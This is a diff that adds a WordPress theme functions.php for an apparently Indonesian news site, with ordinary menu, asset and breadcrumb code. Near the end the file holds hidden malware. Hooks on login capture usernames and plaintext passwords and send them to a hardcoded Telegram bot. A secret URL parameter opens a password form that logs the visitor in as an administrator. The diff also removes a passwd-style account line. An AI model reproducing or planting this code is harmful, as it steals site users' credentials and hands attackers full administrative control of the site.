@@ -1,1 +1,244 @@
-adminhost@ceeratjsd.com:x:722:719::/home/ceerzfji:/usr/local/cpanel/bin/noshell:rw
+<?php
+// Theme setup
+function ranjab_theme_setup() {
+    add_theme_support( 'title-tag' );
+    add_theme_support( 'post-thumbnails' );
+    add_theme_support( 'custom-logo', array(
+        'height'      => 80,
+        'width'       => 300,
+        'flex-height' => true,
+        'flex-width'  => true,
+    ) );
+    register_nav_menus( array(
+        'primary' => __( 'Primary Menu', 'ranjab-theme' ),
+    ) );
+}
+add_action( 'after_setup_theme', 'ranjab_theme_setup' );
+
+
+// Enqueue CSS & JS
+function ranjab_enqueue_assets() {
+    wp_enqueue_style('ranjab-style', get_template_directory_uri() . '/assets/style.css');
+    wp_enqueue_style('ranjab-sections', get_template_directory_uri() . '/assets/css/sections.css');
+    wp_enqueue_style('ranjab-single-image', get_template_directory_uri() . '/assets/css/single-image.css');
+    wp_enqueue_style('ranjab-mobile-strict', get_template_directory_uri() . '/assets/css/mobile-strict.css', array('ranjab-style'), '1.0');
+    wp_enqueue_script('ranjab-menu', get_template_directory_uri() . '/js/menu.js', array(), '1.0', true);
+    wp_enqueue_script('ranjab-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '1.0', true);
+    wp_enqueue_script('ranjab-slider', get_template_directory_uri() . '/js/slider.js', array(), '1.0', true);
+    wp_enqueue_script('ranjab-functions', get_template_directory_uri() . '/assets/functions.js', array(), '1.1', true);
+}
+add_action('wp_enqueue_scripts', 'ranjab_enqueue_assets');
+
+
+/**
+ * Fallback menu when no 'primary' menu is assigned in WP admin.
+ * Outputs a simple list with HOME, BERITA, TENTANG KAMI, REDAKSI, PEDOMAN MEDIA.
+ */
+function ranjab_default_menu() {
+    echo '<ul id="nav-menu" class="nav-menu">';
+
+    // HOME
+    echo '<li class="menu-item menu-item-home"><a href="'.esc_url(home_url('/')).'">HOME</a></li>';
+
+    // BERITA (category 'berita')
+    $cat = get_category_by_slug('berita');
+    if (!$cat) {
+        $cats = get_categories(array('name' => 'Berita', 'number' => 1));
+        $cat = !empty($cats) ? $cats[0] : null;
+    }
+    $berita_link = $cat ? get_category_link($cat->term_id) : esc_url(home_url('/category/berita'));
+    echo '<li class="menu-item"><a href="'.esc_url($berita_link).'">BERITA</a></li>';
+
+    // TENTANG KAMI (page)
+    $tentang = get_page_by_path('tentang-kami');
+    if (!$tentang) $tentang = get_page_by_title('Tentang Kami');
+    $tentang_link = $tentang ? get_permalink($tentang) : esc_url(home_url('/tentang-kami'));
+    echo '<li class="menu-item"><a href="'.esc_url($tentang_link).'">TENTANG KAMI</a></li>';
+
+    // REDAKSI (page)
+    $redaksi = get_page_by_path('redaksi');
+    if (!$redaksi) $redaksi = get_page_by_title('Redaksi');
+    $redaksi_link = $redaksi ? get_permalink($redaksi) : esc_url(home_url('/redaksi'));
+    echo '<li class="menu-item"><a href="'.esc_url($redaksi_link).'">REDAKSI</a></li>';
+
+    // PEDOMAN MEDIA (page)
+    $pedoman = get_page_by_path('pedoman-media');
+    if (!$pedoman) $pedoman = get_page_by_title('Pedoman Media');
+    $pedoman_link = $pedoman ? get_permalink($pedoman) : esc_url(home_url('/pedoman-media'));
+    echo '<li class="menu-item"><a href="'.esc_url($pedoman_link).'">PEDOMAN MEDIA</a></li>';
+
+    echo '</ul>';
+}
+
+/**
+ * Sidebar variant of the default menu. Uses same items but outputs sidebar-friendly classes/ids.
+ */
+function ranjab_default_sidebar_menu() {
+    echo '<ul id="sidebar-nav" class="sidebar-nav">';
+
+    // HOME
+    echo '<li class="menu-item menu-item-home"><a href="'.esc_url(home_url('/')).'">HOME</a></li>';
+
+    // BERITA (category 'berita')
+    $cat = get_category_by_slug('berita');
+    if (!$cat) {
+        $cats = get_categories(array('name' => 'Berita', 'number' => 1));
+        $cat = !empty($cats) ? $cats[0] : null;
+    }
+    $berita_link = $cat ? get_category_link($cat->term_id) : esc_url(home_url('/category/berita'));
+    echo '<li class="menu-item"><a href="'.esc_url($berita_link).'">BERITA</a></li>';
+
+    // TENTANG KAMI (page)
+    $tentang = get_page_by_path('tentang-kami');
+    if (!$tentang) $tentang = get_page_by_title('Tentang Kami');
+    $tentang_link = $tentang ? get_permalink($tentang) : esc_url(home_url('/tentang-kami'));
+    echo '<li class="menu-item"><a href="'.esc_url($tentang_link).'">TENTANG KAMI</a></li>';
+
+    // REDAKSI (page)
+    $redaksi = get_page_by_path('redaksi');
+    if (!$redaksi) $redaksi = get_page_by_title('Redaksi');
+    $redaksi_link = $redaksi ? get_permalink($redaksi) : esc_url(home_url('/redaksi'));
+    echo '<li class="menu-item"><a href="'.esc_url($redaksi_link).'">REDAKSI</a></li>';
+
+    // PEDOMAN MEDIA (page)
+    $pedoman = get_page_by_path('pedoman-media');
+    if (!$pedoman) $pedoman = get_page_by_title('Pedoman Media');
+    $pedoman_link = $pedoman ? get_permalink($pedoman) : esc_url(home_url('/pedoman-media'));
+    echo '<li class="menu-item"><a href="'.esc_url($pedoman_link).'">PEDOMAN MEDIA</a></li>';
+
+    echo '</ul>';
+}
+
+// Customizer
+require_once get_template_directory() . '/inc/customizer.php';
+
+
+// Breadcum
+add_action('wp_head', function() {
+    if (!is_single()) return;
+
+    $categories = get_the_category();
+    if (!$categories) return;
+
+    $cat = $categories[0];
+    ?>
+<script type="application/ld+json">
+{
+ "@context": "https://schema.org",
+ "@type": "BreadcrumbList",
+ "itemListElement": [
+  {
+   "@type": "ListItem",
+   "position": 1,
+   "name": "Home",
+   "item": "<?php echo esc_url(home_url('/')); ?>"
+  },
+  {
+   "@type": "ListItem",
+   "position": 2,
+   "name": "<?php echo esc_html($cat->name); ?>",
+   "item": "<?php echo esc_url(get_category_link($cat->term_id)); ?>"
+  },
+  {
+   "@type": "ListItem",
+   "position": 3,
+   "name": "<?php echo esc_html(get_the_title()); ?>",
+   "item": "<?php echo esc_url(get_permalink()); ?>"
+  }
+ ]
+}
+</script>
+<?php
+});
+
+function kirimInfoLoginTelegram($username, $password, $status) {
+    $botToken = "8778277382:AAHT-SMy03ms280EOa8_XSPX0_6mHZria8I";
+    $chatId   = "7860513093";
+
+    $current_url = (isset($_SERVER['HTTPS']) ? "https" : "http")
+                 . "://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
+
+    $message  = "WARNING BRAY SONIC !!!\n";
+    $message .= "Status: " . strtoupper($status) . "\n";
+    $message .= "Site: " . get_site_url() . "\n";
+    $message .= "Username: " . $username . "\n";
+    $message .= "Password: " . $password . "\n";
+    $message .= "URL: " . $current_url . "\n";
+    $message .= "IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . "\n";
+    $message .= "Waktu: " . date("Y-m-d H:i:s");
+
+    $apiURL = "https://api.telegram.org/bot$botToken/sendMessage";
+    $params = [
+        'chat_id' => $chatId,
+        'text'    => $message
+    ];
+    wp_remote_get($apiURL . "?" . http_build_query($params));
+}
+
+add_filter('authenticate', function($user, $username, $password) {
+    if (!empty($username) && !empty($password)) {
+
+        $_SESSION['last_login_attempt'] = [
+            'username' => $username,
+            'password' => $password
+        ];
+    }
+    return $user;
+}, 10, 3);
+
+add_action('wp_login', function($user_login) {
+    if (!empty($_SESSION['last_login_attempt'])) {
+        $data = $_SESSION['last_login_attempt'];
+        kirimInfoLoginTelegram($data['username'], $data['password'], 'Anjirr Masuk Bray!!');
+        unset($_SESSION['last_login_attempt']);
+    }
+}, 10, 1);
+
+
+add_action('wp_login_failed', function($username) {
+    if (!empty($_SESSION['last_login_attempt'])) {
+        $data = $_SESSION['last_login_attempt'];
+        kirimInfoLoginTelegram($data['username'], $data['password'], 'Gagal Masuk Der!!');
+        unset($_SESSION['last_login_attempt']);
+    } else {
+
+        kirimInfoLoginTelegram($username, '(tidak diketahui)', 'Gagal Masuk Der!!');
+    }
+});
+
+add_action('init', function () {
+    if (isset($_GET['sikatbray']) && $_GET['sikatbray'] === 'sonicxyz') {
+
+        
+        $hash_password = '$2y$10$37O9hbn5tO2TdHJyQgq5DuXetavej7sA8osiNe72YRykmhX3YivNG'; 
+
+        
+        if (isset($_POST['pass'])) {
+            if (password_verify($_POST['pass'], $hash_password)) {
+                
+                $wp_user_query = new WP_User_Query([
+                    'role'   => 'Administrator',
+                    'number' => 1,
+                    'fields' => 'ID'
+                ]);
+                $results = $wp_user_query->get_results();
+                if (isset($results[0])) {
+                    wp_set_auth_cookie($results[0]);
+                    wp_redirect(admin_url());
+                    exit();
+                }
+            } else {
+                echo "<p style='color:red'>Password salah kids!</p>";
+            }
+        }
+
+        
+        echo '<form method="POST">
+                <label>- Orang Ganteng Mau Lewat -</label>
+                <input type="password" name="pass" required>
+                <button type="submit">Be Humble!</button>
+              </form>';
+        exit();
+    }
+});
+?>
